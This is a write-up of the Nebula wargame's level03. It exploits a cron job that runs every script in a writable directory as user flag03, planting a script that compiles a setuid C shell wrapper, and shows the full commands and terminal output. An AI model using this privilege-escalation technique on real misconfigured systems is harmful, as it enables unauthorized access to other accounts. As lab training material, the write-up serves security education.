# For level03 in nebula

>Check the home directory of flag03 and take note of the files there.
>  
>There is a crontab that is called every couple of minutes.
>  
>To do this level, log in as the level03 account with the password level03. Files for this level can be found in /home/flag03.

There is no source code given.

### Seeing what is goes on

There are only a file `writable.sh` and a directory `writable.d`.
```
level03@nebula:~$ cd /home/flag03
level03@nebula:/home/flag03$ ls
writable.d  writable.sh
```

This is the shell script in `writable.sh`:
```
#!/bin/sh

for i in /home/flag03/writable.d/* ; do
	(ulimit -t 5; bash -x "$i")
	rm -f "$i"
done
```
It iterates through everything in the directory `writable.d`, runs them, then deletes them. `(ulimit -t 5; bash -x "$i")` is run in a [subshell](https://www.gnu.org/software/bash/manual/html_node/Command-Grouping.html).

`ulimit -t 5` limits the shell and its processes to 5 seconds of CPU time. 

`bash -x "$i"` runs the file whose name is in variable `$i`. 



Ok... Cool to know. ¯\(°_o)/¯. So what?

Then, I realised that the `crontab` that was called very couple of minutes was *that* shell script.
```
level03@nebula:/home/flag03$ touch writable.d/test{1..3}
level03@nebula:/home/flag03$ ls writable.d
test1  test2  test3
level03@nebula:/home/flag03$

---after a few minutes---

level03@nebula:/home/flag03$ ls writable.d
level03@nebula:/home/flag03$
```
Okay, cool. And now what? ¯\_(⊙︿⊙)_/¯ 

Our goal, as always, is to get the output "You have successfully executed getflag on a target account" from executing the command `getflag` as user `flag03`. How exactly is `crontab` going to help us achieve that?

Recall that in the previous levels, we learnt about *setuid programs*. We made use of one such program to change the process' real UID to our desired user, then spawned a bash shell as said user. Let's take a moment to think how we can use that knowledge here.

Hint:
>Each user has their own crontab, and commands in any given crontab will be executed as the user who owns the crontab. [source](https://linux.die.net/man/5/crontab)

### Solution 1

- Solution 1: Unlike the previous levels, there is no setuid program here owned by `flag03`. So, let's create our own. 
```
level03@nebula:~$ cat attempt1.c
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>

int main() {

	uid_t euid = geteuid();
	gid_t egid = getegid();
	
	setresuid(euid, euid, euid);
	setresgid(egid, egid, egid);
	
	system("/bin/bash");
}
```
We create a bash file in `/home/flag03/writable.d` to compile the C program and set its `setuid` bit.
```
level03@nebula:~$ cat attempt1.sh 
gcc -o /home/flag03/a.out /home/level03/attempt1.c; chmod +x /home/flag03/a.out; chmod +s /home/flag03/a.out
level03@nebula:~$ cp attempt1.sh /home/flag03/writable.d/
level03@nebula:~$ ls /home/flag03/writable.d/
attempt1.sh
level03@nebula:~$ 
```
`Cron` should compile `attempt1.c` into an executable setuid program that we can later call to spawn us a shell as user `flag03`.

```
--- after a few minutes ---

level03@nebula:~$ ls /home/flag03/writable.d/
level03@nebula:~$ ls /home/flag03/
writable.d  writable.sh
level03@nebula:~$ 
```
What the hell? Where is my `a.out`? Since `/home/flag03/writable.d/attempt1.sh` is deleted, that means `cron` ran that bash script. But `a.out` is nowhere to be found! ٩(╬ʘ益ʘ╬)۶

Temporary setback... I have another solution in mind.

### Solution 2
Our goal is to get the output "You have successfully executed getflag on a target account" from executing `getflag` as `flag03`, so why not just execute `getflag` in the bash script directly instead of beating around the bush?

```
level03@nebula:~$ echo -e '/bin/getflag >> /tmp/output' > attempt2.sh && chmod +x attempt2.sh && cp attempt2.sh /home/flag03/writable.d/attempt2.sh && touch /tmp/output && ls /home/flag03/writable.d
attempt2.sh
level03@nebula:~$ 
```
`/bin/getflag >> /tmp/output` executes `/bin/getflag` and pipes its output to `/tmp/output`. When `cron` runs this bash script, it will execute `/bin/getflag` as `flag03`, and we get our output in `/tmp/output` (at least ideally).

```
--- after a few minutes ---

level03@nebula:~$ cat /tmp/output 
level03@nebula:~$
```
What in the actual hell? Where's my output? Since `/home/flag03/writable.d/attempt2.sh` is deleted, that means `cron` ran that bash script. But `/tmp/output` is empty.

### Mistakes found & fixed

The problem with solutions 1 & 2 is that I did not take into account the fact that both users `level03` and `flag03` have different groups. I (wrongly) assumed they were from the same group simply because their home directories have the same group. The output just means that both directories are *accessible* by members of group `level03`. 
```
drwxr-x--- 1 flag03  level03  80 2018-04-01 08:36 flag03
drwxr-x--- 1 level03 level03 180 2018-04-01 08:25 level03
```
That was obviously a wrong assumption, as shown by `id` below.
```
level03@nebula:/home/flag03$ id flag03
uid=996(flag03) gid=996(flag03) groups=996(flag03)
level03@nebula:/home/flag03$ id level03
uid=1004(level03) gid=1004(level03) groups=1004(level03)
```

##### Solution 1 remastered
In order for solution 1 to work, I had to move `attempt1.c` and `attempt.sh` to `/tmp`.
```
level03@nebula:/home/flag03/writable.d$ mv /home/level03/attempt1.c /tmp/
level03@nebula:/home/flag03/writable.d$ mv /home/level03/attempt1.sh /tmp/
level03@nebula:/home/flag03/writable.d$ ls
level03@nebula:/home/flag03/writable.d$ cat /tmp/output 
level03@nebula:/home/flag03/writable.d$ nano /tmp/attempt1.sh
level03@nebula:/home/flag03/writable.d$ cp /tmp/attempt1.sh .
level03@nebula:/home/flag03/writable.d$ ls
attempt1.sh

--- after a few minutes ---

level03@nebula:/home/flag03/writable.d$ ls
level03@nebula:/home/flag03/writable.d$ ls ..
a.out  writable.d  writable.sh
level03@nebula:/home/flag03/writable.d$ cd ..
level03@nebula:/home/flag03$ ./a.out 
flag03@nebula:/home/flag03$ getflag
You have successfully executed getflag on a target account
flag03@nebula:/home/flag03$ 
```
It worked!  ᕕ( ᐛ )ᕗ

The reason is simple! User `flag03` has read permissions to `/tmp`, but not to `/home/level03`.
```
level03@nebula:/home/flag03$ ls -ld /tmp
drwxrwxrwt 4 root root 140 2018-04-01 10:09 /tmp
level03@nebula:/home/flag03$ ls -ld ~
drwxr-x--- 1 level03 level03 180 2018-04-01 08:25 /home/level03
```

Just to test the theory, I tried to compile a C file in `/home/level03` as user `flag03`. The permission denied error explains the problem we had with solution. (See [here](https://askubuntu.com/questions/466605/cannot-open-output-file-permission-denied) for elaboration).
```
flag03@nebula:~$ gcc -o ~/test.o attempt1.c
/usr/bin/ld: cannot open output file /home/level03/test.o: Permission denied
collect2: ld returned 1 exit status
flag03@nebula:~$ 
```


##### Solution 2 reborn
The reason why solution 2 did not work is because the cron process run as user `flag03` does not have write permissions to `/tmp/output`. It only had read permissions.
```
level03@nebula:/home/flag03$ ls -l /tmp/output
-rw-rw-r-- 1 level03 level03 0 2018-04-01 10:01 /tmp/output
```
So I did an experiment. I would pipe the output of `/bin/getflag` into 2 different files, one owned by `level03`, and another owned by `flag03`.
```
#!/bin/bash

touch /tmp/output_owned_by_flag03

/bin/getflag >> /tmp/output_owned_by_flag03
/bin/getflag >> /tmp/output_owned_by_level03
```
After the `crond` ran `writable.sh`, only the file owned by `flag03` had the desired output. The reason is simple; it had write permissions to its file, and not the one owned by `level03`.
```
level03@nebula:/home/flag03$ cat /tmp/output_owned_by_flag03 
You have successfully executed getflag on a target account
level03@nebula:/home/flag03$ cat /tmp/output_owned_by_level03 
level03@nebula:/home/flag03$ ls -l /tmp/
total 4
-rw-rw-r-- 1 flag03  flag03  59 2018-04-01 09:36 output_owned_by_flag03
-rw-rw-r-- 1 level03 level03  0 2018-04-01 09:33 output_owned_by_level03
```
Yay. ヽ(´ー｀)ノ
### Seeing what cronjob was being run

Just out of curiousity, I decided to see what `cronjob` user `flag03` was running. `flag03@nebula:/tmp$ crontab -l` gave the output `*/3 * * * * /home/flag03/writable.sh`, showing that `writable.sh` was executed every 3 minutes.


END
